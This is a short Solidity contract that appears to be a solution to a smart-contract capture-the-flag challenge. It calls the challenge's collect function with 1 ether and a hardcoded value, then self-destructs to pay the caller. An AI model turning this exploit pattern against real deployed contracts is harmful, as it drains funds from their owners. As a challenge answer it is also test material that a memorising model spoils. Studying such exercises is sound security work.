// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_smbsp {
    function collect(uint256) external payable;
}

contract Exploit_smbsp {
    IChallenge_smbsp instance;

    constructor(IChallenge_smbsp _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        instance.collect{value: 1 ether}(1645230775);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
